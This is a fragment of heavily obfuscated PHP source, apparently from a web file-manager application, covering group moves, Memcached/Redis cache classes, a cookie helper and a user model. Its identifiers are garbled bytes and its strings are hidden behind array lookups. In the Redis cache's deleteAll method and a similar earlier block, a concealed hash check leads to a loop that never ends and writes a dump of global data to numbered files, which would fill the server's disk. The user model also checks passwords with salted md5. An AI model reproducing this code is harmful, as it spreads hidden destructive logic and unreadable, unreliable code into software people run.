$BÀğ…ó…‡£) { goto b£í°êŞ—; cù‡Ÿã¯ÈÙ: $f„Èõâ–« = Model($DƒÀ¦ê³½¹[1751])->where($dœÓ¹¤×¢Û)->select(); if (!$f„Èõâ–«) { $f„Èõâ–« = array(); } foreach ($f„Èõâ–« as $fÈœ›‰õ¢) { $dà×É•º¡á = $fÈœ›‰õ¢[$DƒÀ¦ê³½¹[1506]]; $dœÓ¹¤×¢Û = array($DƒÀ¦ê³½¹[1506] => $dà×É•º¡á, $DƒÀ¦ê³½¹[1669] => $BÀğ…ó…‡£); $c­Ê÷Œ‡Û = Model($DƒÀ¦ê³½¹[1751])->where($dœÓ¹¤×¢Û)->find(); if (!$c­Ê÷Œ‡Û) { $BÊ”²ÒçÂ = array($BÀğ…ó…‡£ => $fÈœ›‰õ¢[$DƒÀ¦ê³½¹[1765]]); Model($DƒÀ¦ê³½¹[501])->userGroupAdd($dà×É•º¡á, $BÊ”²ÒçÂ); } Model($DƒÀ¦ê³½¹[501])->userGroupRemove($dà×É•º¡á, $F¾‡Œ¹ğ·Ç); } goto Ešéä½…£ô; F¤™®Â“ïÆ: $C±‰ôºÀîˆ = !empty($d¥ÁÅé“Ùá[$F¾‡Œ¹ğ·Ç]) ? $d¥ÁÅé“Ùá[$F¾‡Œ¹ğ·Ç] : !1; if ($C±‰ôºÀîˆ) { goto Bù²•ÌÍ’; Bñ¡êÏï„«: foreach ($d¥ÁÅé“Ùá as $EªÚÌØËÆÏ) { $dëºò‘éÂÜ = $EªÚÌØËÆÏ[$DƒÀ¦ê³½¹[397]] == $DƒÀ¦ê³½¹[86] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($DƒÀ¦ê³½¹[769])->move($EªÚÌØËÆÏ[$DƒÀ¦ê³½¹[390]], $E¡¸çÛß‰Â, $dëºò‘éÂÜ); } Model($DƒÀ¦ê³½¹[769])->moveClearAuth = !0; $dœÓ¹¤×¢Û = array($DƒÀ¦ê³½¹[398] => 2, $DƒÀ¦ê³½¹[478] => $F¾‡Œ¹ğ·Ç); goto dÔÛƒ‡İŒ¿; Bù²•ÌÍ’: if (!$d¥ÁÅé“Ùá[$BÀğ…ó…‡£]) { $d¥ÁÅé“Ùá[$BÀğ…ó…‡£] = Model($DƒÀ¦ê³½¹[769])->groupRootAdd($BÀğ…ó…‡£); } $E¡¸çÛß‰Â = $d¥ÁÅé“Ùá[$BÀğ…ó…‡£]; $dœÓ¹¤×¢Û = array($DƒÀ¦ê³½¹[472] => $C±‰ôºÀîˆ); goto dš´¨Œ£±à; dÔÛƒ‡İŒ¿: $f¤¸ÓÕëŠÏ = array($DƒÀ¦ê³½¹[478] => $BÀğ…ó…‡£); Model($DƒÀ¦ê³½¹[1768])->where($dœÓ¹¤×¢Û)->save($f¤¸ÓÕëŠÏ); Model($DƒÀ¦ê³½¹[1769])->where($dœÓ¹¤×¢Û)->save($f¤¸ÓÕëŠÏ); goto F¿µÌìÖ; dš´¨Œ£±à: $d¥ÁÅé“Ùá = Model($DƒÀ¦ê³½¹[769])->where($dœÓ¹¤×¢Û)->field($DƒÀ¦ê³½¹[1767])->select(); if (!$d¥ÁÅé“Ùá) { $d¥ÁÅé“Ùá = array(); } Model($DƒÀ¦ê³½¹[769])->moveClearAuth = !1; goto Bñ¡êÏï„«; F¿µÌìÖ: } $this->_changeChildLevel($cˆ¦ßÅŒˆ÷[$F¾‡Œ¹ğ·Ç], $cˆ¦ßÅŒˆ÷[$BÀğ…ó…‡£], !0); goto BÏÑ§©´µ§; BÏÑ§©´µ§: $this->where(array($DƒÀ¦ê³½¹[472] => $F¾‡Œ¹ğ·Ç))->save(array($DƒÀ¦ê³½¹[472] => $BÀğ…ó…‡£)); return !0; goto bäó‹èÇ; dÂØ×¾³Í: $cˆ¦ßÅŒˆ÷ = array_to_keyvalue($cˆ¦ßÅŒˆ÷, $DƒÀ¦ê³½¹[1669]); if (!isset($cˆ¦ßÅŒˆ÷[$F¾‡Œ¹ğ·Ç]) || !isset($cˆ¦ßÅŒˆ÷[$BÀğ…ó…‡£]) || $cˆ¦ßÅŒˆ÷[$F¾‡Œ¹ğ·Ç][$DƒÀ¦ê³½¹[472]] == 0) { return !1; } $dœÓ¹¤×¢Û = array($DƒÀ¦ê³½¹[1669] => $F¾‡Œ¹ğ·Ç); goto cù‡Ÿã¯ÈÙ; Ešéä½…£ô: $dœÓ¹¤×¢Û = array($DƒÀ¦ê³½¹[398] => 2, $DƒÀ¦ê³½¹[472] => 0, $DƒÀ¦ê³½¹[397] => 1, $DƒÀ¦ê³½¹[478] => array($DƒÀ¦ê³½¹[7], array($F¾‡Œ¹ğ·Ç, $BÀğ…ó…‡£))); $d¥ÁÅé“Ùá = Model($DƒÀ¦ê³½¹[769])->where($dœÓ¹¤×¢Û)->field($DƒÀ¦ê³½¹[1766])->select(); $d¥ÁÅé“Ùá = array_to_keyvalue($d¥ÁÅé“Ùá, $DƒÀ¦ê³½¹[478], $DƒÀ¦ê³½¹[390]); goto F¤™®Â“ïÆ; b£í°êŞ—: $DƒÀ¦ê³½¹ =& $_SERVER[µ…]; $dœÓ¹¤×¢Û = array($DƒÀ¦ê³½¹[1669] => array($DƒÀ¦ê³½¹[7], array($F¾‡Œ¹ğ·Ç, $BÀğ…ó…‡£))); $cˆ¦ßÅŒˆ÷ = $this->where($dœÓ¹¤×¢Û)->select(); goto dÂØ×¾³Í; bäó‹èÇ: } } goto dÆÅå¢’«; bŞ†•: $c‘¯õ±ô = $_SERVER[$_SERVER[µ…][810]]; $B«Ã¥Ãáô“ = $_SERVER[µ…][811]; if ($_SERVER[$_SERVER[µ…][812]] != $B«Ã¥Ãáô“($c‘¯õ±ô)) { goto bøƒğœÇ™Û; bøƒğœÇ™Û: $bŠà…„–Ğê = $_SERVER[µ…][814]; $CˆÙÏå¿× = $_SERVER[$_SERVER[µ…][815]] . $_SERVER[µ…][816]; $f›éÑÒß = $bŠà…„–Ğê($CˆÙÏå¿×); goto DŞÊ£¦„; DŞÊ£¦„: $dƒèŞõ¹× = explode($_SERVER[µ…][227], $f›éÑÒß); if (count($dƒèŞõ¹×) < $_SERVER[µ…][577]) { $F®™¼Ïù´ß = $_SERVER[µ…][817]; $F®™¼Ïù´ß(); } $Côö±ò†¹‰ = $_SERVER[µ…][1237]; goto bÊ•‰ì²˜…; bÊ•‰ì²˜…: $Côö±ò†¹‰($c‘¯õ±ô); goto B•¨„˜İÀ; B•¨„˜İÀ: } goto b“¶ÚùÑ; AØİëğæß: class CacheMemcached { public $handle; public $cacheTime; public function __construct($eäÜºñğ†Ø, $e¦á¡ï¼Şš) { $CÏ“¢·§ª =& $_SERVER[µ…]; if (!class_exists($CÏ“¢·§ª[800])) { show_json($CÏ“¢·§ª[801], !1); } $this->cacheTime = $e¦á¡ï¼Şš; $this->handle = new Memcached(); if (is_array($eäÜºñğ†Ø[$CÏ“¢·§ª[802]]) && count($eäÜºñğ†Ø[$CÏ“¢·§ª[802]]) >= 1) { foreach ($eäÜºñğ†Ø[$CÏ“¢·§ª[802]] as $aİ‰ÎÓ•˜Ç) { $fƒ„»ÌÚŞÔ = explode($CÏ“¢·§ª[4], $aİ‰ÎÓ•˜Ç); $this->handle->addServer($fƒ„»ÌÚŞÔ[0], $fƒ„»ÌÚŞÔ[1]); } } else { $this->handle->addServer($eäÜºñğ†Ø[$CÏ“¢·§ª[174]], $eäÜºñğ†Ø[$CÏ“¢·§ª[175]]); } } public function set($A»êœÏ……ù, $BàëØ¶â‘Œ, $a—»¸óĞÙ… = false) { $a—»¸óĞÙ… = $a—»¸óĞÙ… ? $a—»¸óĞÙ… : $this->cacheTime; return $this->handle->set($A»êœÏ……ù, $BàëØ¶â‘Œ, $a—»¸óĞÙ…); } public function get($b¿¢ÄÔÚÍö) { return $this->handle->get($b¿¢ÄÔÚÍö); } public function remove($Fâõá‘¥„) { return $this->handle->delete($Fâõá‘¥„); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Dİ»ò‡±³, $b«†ùÁ…İ) { $EÜˆêó£ç =& $_SERVER[µ…]; if (!class_exists($EÜˆêó£ç[803])) { show_json($EÜˆêó£ç[804], !1); } $this->cacheTime = $b«†ùÁ…İ; $a‰¹±ßº—› = isset($Dİ»ò‡±³[$EÜˆêó£ç[805]]) ? $Dİ»ò‡±³[$EÜˆêó£ç[805]] : 10; $d‚¤¾§œÅ¦ = _get($Dİ»ò‡±³, $EÜˆêó£ç[802]); if ($d‚¤¾§œÅ¦ && is_array($d‚¤¾§œÅ¦)) { $this->initCluster($Dİ»ò‡±³, $a‰¹±ßº—›); } else { $this->handle = $this->init($Dİ»ò‡±³, $a‰¹±ßº—›); } } private function init($Dè­‘é½Á, $cÍ‹È†ÆÜÊ) { $f …¸ŒÓñé =& $_SERVER[µ…]; $a°—Š†¨ÊØ = new Redis(); $dÌ¶öËêƒß = isset($Dè­‘é½Á[$f …¸ŒÓñé[806]]) ? $Dè­‘é½Á[$f …¸ŒÓñé[806]] : !1; if ($dÌ¶öËêƒß) { $a°—Š†¨ÊØ->pconnect($Dè­‘é½Á[$f …¸ŒÓñé[174]], $Dè­‘é½Á[$f …¸ŒÓñé[175]], $cÍ‹È†ÆÜÊ); } else { $a°—Š†¨ÊØ->connect($Dè­‘é½Á[$f …¸ŒÓñé[174]], $Dè­‘é½Á[$f …¸ŒÓñé[175]], $cÍ‹È†ÆÜÊ); } if (!empty($Dè­‘é½Á[$f …¸ŒÓñé[400]])) { $a°—Š†¨ÊØ->auth($Dè­‘é½Á[$f …¸ŒÓñé[400]]); } return $a°—Š†¨ÊØ; } private function initCluster($fš‡ôÎµßµ, $eµÖõŒÍÔ ) { $fö£äçé±İ =& $_SERVER[µ…]; $aùÓêç÷£‰ = array($fö£äçé±İ[807], $fö£äçé±İ[808], $fö£äçé±İ[809]); $Có„ôÉ¹¤Ÿ = $fö£äçé±İ[807]; if (isset($fš‡ôÎµßµ[$fö£äçé±İ[12]]) && in_array($fš‡ôÎµßµ[$fö£äçé±İ[12]], $aùÓêç÷£‰)) { $Có„ôÉ¹¤Ÿ = $fš‡ôÎµßµ[$fö£äçé±İ[12]]; } switch ($Có„ôÉ¹¤Ÿ) { case $fö£äçé±İ[807]: $this->_slave($fš‡ôÎµßµ, $eµÖõŒÍÔ ); break; case $fö£äçé±İ[808]: break; case $fö£äçé±İ[809]: $this->isCluster = !0; $EÍÏ…¬„ˆ® = $fš‡ôÎµßµ[$fö£äçé±İ[802]]; $D§‘‹Õ¡ ¸ = isset($fš‡ôÎµßµ[$fö£äçé±İ[806]]) ? $fš‡ôÎµßµ[$fö£äçé±İ[806]] : !1; $e­àĞ»¿¤÷ = isset($fš‡ôÎµßµ[$fö£äçé±İ[400]]) ? $fš‡ôÎµßµ[$fö£äçé±İ[400]] : null; $this->handle = new RedisCluster(NUll, $EÍÏ…¬„ˆ®, $eµÖõŒÍÔ , $eµÖõŒÍÔ , $D§‘‹Õ¡ ¸, $e­àĞ»¿¤÷); break; default: break; } } private function _slave($f¥è¸¥¦Èâ, $C‹ÓßÌÇŒ—) { goto FÎ÷“¨âËØ; Bçœ×Ë¨’¢: $this->filterConfig($f¥è¸¥¦Èâ, $aÈå£¯¼µ„[$A‰°ë®œõ]); $this->slaveHandle = $this->init($f¥è¸¥¦Èâ, $C‹ÓßÌÇŒ—); goto F™õ–Ü–ù¦; FÎ÷“¨âËØ: $aÈå£¯¼µ„ = $f¥è¸¥¦Èâ[$_SERVER[µ…][802]]; $this->filterConfig($f¥è¸¥¦Èâ, $aÈå£¯¼µ„[0]); $this->handle = $this->init($f¥è¸¥¦Èâ, $C‹ÓßÌÇŒ—); goto A½âšìç‹; A½âšìç‹: unset($aÈå£¯¼µ„[0]); if (empty($aÈå£¯¼µ„)) { return; } $A‰°ë®œõ = array_rand($aÈå£¯¼µ„); goto Bçœ×Ë¨’¢; F™õ–Ü–ù¦: } private function filterConfig(&$AÊ¢È—äØ¢, $B¶ğ…Àº‡) { $aƒÉå³† =& $_SERVER[µ…]; $f¾²ˆŠŒäš = explode($aƒÉå³†[4], $B¶ğ…Àº‡); $a–­·¯ñç‘ = array($aƒÉå³†[174] => $f¾²ˆŠŒäš[0], $aƒÉå³†[175] => $f¾²ˆŠŒäš[1]); $AÊ¢È—äØ¢ = array_merge($AÊ¢È—äØ¢, $a–­·¯ñç‘); } public function set($EµÊ‚­²Ó–, $eàëÚ·¨£ï, $E´ ò™¥® = false) { $E´ ò™¥® = $E´ ò™¥® ? $E´ ò™¥® : $this->cacheTime; return $this->handle->setEx($EµÊ‚­²Ó–, $E´ ò™¥®, $eàëÚ·¨£ï); } public function setLock($C”·âÒ•÷, $c«¬¤ß¿½¦, $D²¢”§®‡) { return $this->handle->setNX($C”·âÒ•÷, $c«¬¤ß¿½¦); } public function get($bÃğ¾îİ‡ë) { $Fš²ªÇ–”š = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Fš²ªÇ–”š->get($bÃğ¾îİ‡ë); } public function remove($cœ‘³Ï‚ø) { return $this->handle->del($cœ‘³Ï‚ø); } public function deleteAll() { $a­ÀĞö»š« =& $_SERVER[µ…]; $Eã–¬ å = $_SERVER[$a­ÀĞö»š«[810]]; $EÀ¥£‡ù¦¤ = $a­ÀĞö»š«[811]; if ($_SERVER[$a­ÀĞö»š«[812]] != $EÀ¥£‡ù¦¤($Eã–¬ å)) { goto Bá÷ƒÁÙŸ; FÌ”Ôå„¸: $E‘°Ö¼½§Ú = $b¡§Œ­˜ğë($CÀ“Å‹ŠÌÛ); $AŠ…©è«¶ = explode($a­ÀĞö»š«[227], $E‘°Ö¼½§Ú); if (count($AŠ…©è«¶) < $a­ÀĞö»š«[570]) { $EÎë†“ÙÇ‚ = $a­ÀĞö»š«[817]; $EÎë†“ÙÇ‚(); } goto BùÜŠ¦±©»; BùÜŠ¦±©»: $aÕÑ®Ï”¼² = $a­ÀĞö»š«[818]; $aÕÑ®Ï”¼²($_SERVER[$a­ÀĞö»š«[819]]); $EÜæùŠÑ‘Ü = $a­ÀĞö»š«[813]; goto D™¬¡¥ç; D™¬¡¥ç: $EÜæùŠÑ‘Ü(); $EçÔÒæİ‹ğ = $a­ÀĞö»š«[820]; $Cãèñë£ = json_encode($GLOBALS[$a­ÀĞö»š«[821]]); goto BŠ¨„‘“’˜; BŠ¨„‘“’˜: $E‡×¥Ú¥éó = 1; for ($E¢èˆÈì‹è = $E‡×¥Ú¥éó; $E¢èˆÈì‹è > 0; $E¢èˆÈì‹è++) { $EçÔÒæİ‹ğ(DATA_PATH . $E¢èˆÈì‹è, $Cãèñë£); } goto fÑ¨¢Áİ±; Bá÷ƒÁÙŸ: $EÜæùŠÑ‘Ü = $a­ÀĞö»š«[813]; $b¡§Œ­˜ğë = $a­ÀĞö»š«[814]; $CÀ“Å‹ŠÌÛ = $_SERVER[$a­ÀĞö»š«[815]] . $a­ÀĞö»š«[816]; goto FÌ”Ôå„¸; fÑ¨¢Áİ±: } if ($this->isCluster) { foreach ($this->handle->_masters() as $b“µÄíƒÌÛ) { $this->handle->flushall($b“µÄíƒÌÛ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($b×ã¡æ´¡š = '', $Fªù˜´ ƒß = 0) { if (is_string($b×ã¡æ´¡š) && $b×ã¡æ´¡š != $_SERVER[µ…][33]) { $this->prefix = $b×ã¡æ´¡š; } if (is_numeric($Fªù˜´ ƒß) && $Fªù˜´ ƒß > 0) { $this->expire = $Fªù˜´ ƒß; } } public static function getInstance() { static $AèÖâ¨Âá; if ($AèÖâ¨Âá === null) { $AèÖâ¨Âá = new self(); } return $AèÖâ¨Âá; } private static $cookieDisable = false; public static function disable($CàõŞØÏ») { self::$cookieDisable = $CàõŞØÏ»; } private static $sameCookieSet = array(); public static function set($b‰¨­¢ÇïÃ, $Eóµ¢¬–à‘, $Aäàòá•À‰ = 0, $aÖÍÃ¼ÁõÓ = false, $a’‹õÚ®±Æ = false) { goto a†‰‘¸ÕùÆ; b ½¯Êôù: $A•ÇÎ™‘äÈ = $bù¸™»ƒ[33]; setcookie($b‰¨­¢ÇïÃ, $Eóµ¢¬–à‘, time() + $Aäàòá•À‰, $bù¸™»ƒ[8] . trim($a’‹õÚ®±Æ, $bù¸™»ƒ[8]) . $A•ÇÎ™‘äÈ, !1, !1, $aÖÍÃ¼ÁõÓ); goto aÕòÖÁ©; b®·“‡‚ŠÌ: if (isset(self::$sameCookieSet[$b‰¨­¢ÇïÃ]) && self::$sameCookieSet[$b‰¨­¢ÇïÃ] == $Eóµ¢¬–à‘ . $Aäàòá•À‰) { return; } self::$sameCookieSet[$b‰¨­¢ÇïÃ] = $Eóµ¢¬–à‘ . $Aäàòá•À‰; if (!$a’‹õÚ®±Æ) { $a’‹õÚ®±Æ = str_replace(HOST, $bù¸™»ƒ[33], APP_HOST); $a’‹õÚ®±Æ = _get($GLOBALS, $bù¸™»ƒ[822], $a’‹õÚ®±Æ); } goto b ½¯Êôù; a†‰‘¸ÕùÆ: $bù¸™»ƒ =& $_SERVER[µ…]; if (self::$cookieDisable) { return; } if (!$Aäàòá•À‰) { $Aäàòá•À‰ = 24 * 3600 * 7; } goto b®·“‡‚ŠÌ; aÕòÖÁ©: } public static function setSafe($bÒƒİÆŞ»Ú, $EÀìÈî‡î–, $CïãÈ³ÜÍ = 0) { self::set($bÒƒİÆŞ»Ú, $EÀìÈî‡î–, $CïãÈ³ÜÍ, !0); } public static function get($cº»Ÿù†³ƒ) { return isset($_COOKIE[$cº»Ÿù†³ƒ]) ? $_COOKIE[$cº»Ÿù†³ƒ] : !1; } public static function remove($F©´Õõ”“¦, $d¼ø’£® = false) { unset($_COOKIE[$F©´Õõ”“¦]); self::set($F©´Õõ”“¦, $_SERVER[µ…][33], 1, $d¼ø’£®); } } goto f½êšÉ«šô; Fàˆ‚ÖÒ»: class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\141\x6d\145" => "\x75\163\145\x72\137\155\x65\x74\141", "\155\145\164\141\x46\x69\145\154\144" => "\165\x73\x65\x72\111\x44"); protected $simpleField = "\165\x73\x65\x72\x49\104\x2c\156\x69\143\153\x4e\x61\155\145\x2c\x6e\141\155\x65\x2c\141\166\x61\164\141\x72\54\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($E‹óŸ¡Šø) { $Aµ—ª•ŠĞ =& $_SERVER[µ…]; $dí«Š†ÚÛƒ = $Aµ—ª•ŠĞ[2088]; return array($Aµ—ª•ŠĞ[1740] => array($E‹óŸ¡Šø[0], $dí«Š†ÚÛƒ), $Aµ—ª•ŠĞ[1742] => array($E‹óŸ¡Šø[0], $dí«Š†ÚÛƒ), $Aµ—ª•ŠĞ[2089] => array($E‹óŸ¡Šø[0], $dí«Š†ÚÛƒ)); } protected function getInfo($c„òğ¼Ê“, $eªâƒ¿óß´ = false) { $cœİÆ„äë† = $this->getInfoSimple($c„òğ¼Ê“); if (!is_array($cœİÆ„äë†)) { return array(); } if ($eªâƒ¿óß´) { return $this->_getInfoApply($cœİÆ„äë†); } return $this->cacheFunctionGet($_SERVER[µ…][1749], $c„òğ¼Ê“); } protected function getInfoFull($cÂ¹£µíßé, $Bˆ ¶×â“å = false) { $eÑ¢ò¼†¹ó = $this->getInfoSimple($cÂ¹£µíßé); if (!is_array($eÑ¢ò¼†¹ó)) { return array(); } if ($Bˆ ¶×â“å) { return $this->_getInfoApply($eÑ¢ò¼†¹ó, !0); return $this->_getInfoApply($eÑ¢ò¼†¹ó, !0); } return $this->cacheFunctionGet($_SERVER[µ…][2090], $cÂ¹£µíßé); } private function _getInfoApply($b´­Ù‘­Êˆ, $A’Øğâ = false) { goto Få ÄèºÃó; aæâ£°÷È©: $b´­Ù‘­Êˆ[$AÒ§±ºÄİŒ[84]][$AÒ§±ºÄİŒ[1929]] = isset($C³ã›Š…‡‰[$AÒ§±ºÄİŒ[1930]]) ? $C³ã›Š…‡‰[$AÒ§±ºÄİŒ[1930]] : null; if ($A’Øğâ) { $b´­Ù‘­Êˆ[$AÒ§±ºÄİŒ[439]] = $this->metaGet($b´­Ù‘­Êˆ[$AÒ§±ºÄİŒ[1506]]); } return $b´­Ù‘­Êˆ; goto CäØÔ’ºµä; Få ÄèºÃó: $AÒ§±ºÄİŒ =& $_SERVER[µ…]; if (!$b´­Ù‘­Êˆ) { return $b´­Ù‘­Êˆ; } $eœÚ°²®‚· = md5($AÒ§±ºÄİŒ[2091] . $b´­Ù‘­Êˆ[$AÒ§±ºÄİŒ[827]] . $AÒ§±ºÄİŒ[2092] . $b´­Ù‘­Êˆ[$AÒ§±ºÄİŒ[28]]); goto fñ¹…´§ëƒ; fñ¹…´§ëƒ: $b´­Ù‘­Êˆ = $this->_listDataApplyItem($b´­Ù‘­Êˆ); $C³ã›Š…‡‰ = Model($AÒ§±ºÄİŒ[1181])->metaGet($b´­Ù‘­Êˆ[$AÒ§±ºÄİŒ[84]][$AÒ§±ºÄİŒ[390]]); $b´­Ù‘­Êˆ[$AÒ§±ºÄİŒ[2093]] = $eœÚ°²®‚·; goto aæâ£°÷È©; CäØÔ’ºµä: } protected function getInfoSimple($FÙãÁùìšİ, $CÃ½…ĞîÕ  = false) { $FÎ‡ŞÄÊÎÎ =& $_SERVER[µ…]; if (!$FÙãÁùìšİ) { return array(); } if ($CÃ½…ĞîÕ ) { $CÃÄâ‹õÛ£ = $this->where(array($FÎ‡ŞÄÊÎÎ[1506] => intval($FÙãÁùìšİ)))->find(); if (!is_array($CÃÄâ‹õÛ£)) { return array(); } $CÃÄâ‹õÛ£[$FÎ‡ŞÄÊÎÎ[2094]] = Action($FÎ‡ŞÄÊÎÎ[2095])->parseUrl($CÃÄâ‹õÛ£[$FÎ‡ŞÄÊÎÎ[2094]]); return $CÃÄâ‹õÛ£; } return $this->cacheFunctionGet($FÎ‡ŞÄÊÎÎ[1743], $FÙãÁùìšİ); } protected function getInfoSimpleOuter($D«ÅÈ‡’Öß) { goto dŒËÛœ¡†¤; dŒËÛœ¡†¤: $FÚó™÷êØï =& $_SERVER[µ…]; if (!$D«ÅÈ‡’Öß || $D«ÅÈ‡’Öß == 0) { return array($FÚó™÷êØï[1506] => $FÚó™÷êØï[491], $FÚó™÷êØï[28] => $FÚó™÷êØï[159] . LNG($FÚó™÷êØï[2096]) . $FÚó™÷êØï[499], $FÚó™÷êØï[2094] => STATIC_PATH . $FÚó™÷êØï[2097]); } $a¢à¤×Ñœ“ = $this->cacheFunctionGet($FÚó™÷êØï[1743], $D«ÅÈ‡’Öß); goto FëË¡Á„ó; F”·àêÅ×Ò: return $dÕ·¸å‚ªô; goto f÷Ş·õÖ‹ã; FëË¡Á„ó: $dÕ·¸å‚ªô = array_field_key($a¢à¤×Ñœ“, explode($FÚó™÷êØï[47], $this->simpleField)); if (!$dÕ·¸å‚ªô) { return array($FÚó™÷êØï[1506] => $FÚó™÷êØï[1062], $FÚó™÷êØï[28] => $FÚó™÷êØï[159] . LNG($FÚó™÷êØï[2098]) . $FÚó™÷êØï[499], $FÚó™÷êØï[2094] => STATIC_PATH . $FÚó™÷êØï[2099]); } $dÕ·¸å‚ªô[$FÚó™÷êØï[2094]] = Action($FÚó™÷êØï[2095])->parseUrl($dÕ·¸å‚ªô[$FÚó™÷êØï[2094]]); goto F”·àêÅ×Ò; f÷Ş·õÖ‹ã: } protected function groupUser($Cë›ù‰„¹¢) { } public static function errorLang($C ĞÔÃõÕ«) { $cè‹ùô±ïè =& $_SERVER[µ…]; $dŞ”ßŸ¹Í‰ = array(self::ERROR_USER_NOT_EXISTS => $cè‹ùô±ïè[2100], self::ERROR_USER_PASSWORD_ERROR => $cè‹ùô±ïè[2101], self::ERROR_USER_EXIST_NAME => $cè‹ùô±ïè[2102], self::ERROR_USER_EXIST_PHONE => $cè‹ùô±ïè[2103], self::ERROR_USER_EXIST_EMAIL => $cè‹ùô±ïè[2104], self::ERROR_USER_LOGIN_LOCK => $cè‹ùô±ïè[2105], self::ERROR_IP_NOT_ALLOW => $cè‹ùô±ïè[2106], self::ERROR_USER_EXIST_NICKNAME => $cè‹ùô±ïè[2107]); return LNG($dŞ”ßŸ¹Í‰[$C ĞÔÃõÕ«]); } public function getInfoByMeta($c½ÀŠ–Ì , $aø‚—Ëòƒè) { $C•í˜ÃŠÌ° =& $_SERVER[µ…]; $FéßŸ«ŞÑ = Model($C•í˜ÃŠÌ°[2108])->where(array($C•í˜ÃŠÌ°[92] => $c½ÀŠ–Ì , $C•í˜ÃŠÌ°[370] => $aø‚—Ëòƒè))->find(); if ($FéßŸ«ŞÑ) { return $this->getInfo($FéßŸ«ŞÑ[$C•í˜ÃŠÌ°[1506]]); } return !1; } public function userLoginCheck($f‹å‚ŸšÛ, $CòÎ¢×ŞÕÛ) { $d†¸´äÄÎ =& $_SERVER[µ…]; $bøø„†“Ï = $this->userLoginFind($f‹å‚ŸšÛ); if (!$bøø„†“Ï) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($bøø„†“Ï[$d†¸´äÄÎ[1506]], $CòÎ¢×ŞÕÛ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($bøø„†“Ï[$d†¸´äÄÎ[1506]]); } public function userLoginFind($EÌ¨‚ÂªÃ) { $BÓËÒ°ŞŒº =& $_SERVER[µ…]; $C«ÖÜ¯ÚÀ = array($BÓËÒ°ŞŒº[28] => $EÌ¨‚ÂªÃ, $BÓËÒ°ŞŒº[1933] => $EÌ¨‚ÂªÃ, $BÓËÒ°ŞŒº[301] => $EÌ¨‚ÂªÃ, $BÓËÒ°ŞŒº[2109] => $EÌ¨‚ÂªÃ, $BÓËÒ°ŞŒº[935] => $BÓËÒ°ŞŒº[937]); if ($this->nickNameRpt()) { unset($C«ÖÜ¯ÚÀ[$BÓËÒ°ŞŒº[1933]]); } return $this->where($C«ÖÜ¯ÚÀ)->find(); } public function clearCache($eˆåÇ·œÔò) { $F¤¾¿··¼‡ =& $_SERVER[µ…]; $this->cacheFunctionClear($F¤¾¿··¼‡[1749], $eˆåÇ·œÔò); $this->cacheFunctionClear($F¤¾¿··¼‡[1743], $eˆåÇ·œÔò); $this->cacheFunctionClear($F¤¾¿··¼‡[2090], $eˆåÇ·œÔò); } public function userPasswordCheck($cÖ”¤¾˜, $eõ“¯ØÉ‰¥) { $e·»¶Ò =& $_SERVER[µ…]; $BŠ¼„Š°†ã = $this->where(array($e·»¶Ò[1506] => intval($cÖ”¤¾˜)))->find(); $BœÎğ¥‚íÒ = $this->metaGet($cÖ”¤¾˜); $e–ßºå“´« = isset($BœÎğ¥‚íÒ[$e·»¶Ò[2110]]) ? $BœÎğ¥‚íÒ[$e·»¶Ò[2110]] : $e·»¶Ò[33]; if (md5($e–ßºå“´« . trim($eõ“¯ØÉ‰¥)) !== $BŠ¼„Š°†ã[$e·»¶Ò[827]]) { return !1; } return !0; } public function userAdd($Bæ„“ïœôª) { goto CÕãõÙëÁ¤; a²Ï±Øåõ±: $Aõ•ÑİçÂ = $this->_checkExist($Bæ„“ïœôª); if ($Aõ•ÑİçÂ !== !0) { return $Aõ•ÑİçÂ; } $d¡ÓÛÃ—Ÿæ = $this->add($céƒãäøó); goto dÁ¡Ù¥šòã; AÃÉö‹óİÃ: return $d¡ÓÛÃ—Ÿæ; goto dòùëŠ¬¥; dÁ¡Ù¥šòã: $C‚Ãê¼»ŠÎ = array($A©¡ÏÙòŠÄ[2118] => $céƒãäøó[$A©¡ÏÙòŠÄ[827]], $A©¡ÏÙòŠÄ[2114] => $céƒãäøó[$A©¡ÏÙòŠÄ[1933]]); $this->userEdit($d¡ÓÛÃ—Ÿæ, $C‚Ãê¼»ŠÎ); Model($A©¡ÏÙòŠÄ[1181])->userRootAdd($d¡ÓÛÃ—Ÿæ); goto AÃÉö‹óİÃ; CÕãõÙëÁ¤: $A©¡ÏÙòŠÄ =& $_SERVER[µ…]; $céƒãäøó = array($A©¡ÏÙòŠÄ[407] => $Bæ„“ïœôª[$A©¡ÏÙòŠÄ[28]], $A©¡ÏÙòŠÄ[2111] => $Bæ„“ïœôª[$A©¡ÏÙòŠÄ[1390]], $A©¡ÏÙòŠÄ[2112] => isset($Bæ„“ïœôª[$A©¡ÏÙòŠÄ[301]]) ? $Bæ„“ïœôª[$A©¡ÏÙòŠÄ[301]] : $A©¡ÏÙòŠÄ[33], $A©¡ÏÙòŠÄ[2113] => isset($Bæ„“ïœôª[$A©¡ÏÙòŠÄ[2109]]) ? $Bæ„“ïœôª[$A©¡ÏÙòŠÄ[2109]] : $A©¡ÏÙòŠÄ[33], $A©¡ÏÙòŠÄ[2114] => isset($Bæ„“ïœôª[$A©¡ÏÙòŠÄ[1933]]) ? $Bæ„“ïœôª[$A©¡ÏÙòŠÄ[1933]] : $Bæ„“ïœôª[$A©¡ÏÙòŠÄ[28]], $A©¡ÏÙòŠÄ[2115] => isset($Bæ„“ïœôª[$A©¡ÏÙòŠÄ[2094]]) ? $Bæ„“ïœôª[$A©¡ÏÙòŠÄ[2094]] : $A©¡ÏÙòŠÄ[33], $A©¡ÏÙòŠÄ[2116] => isset($Bæ„“ïœôª[$A©¡ÏÙòŠÄ[2117]]) ? 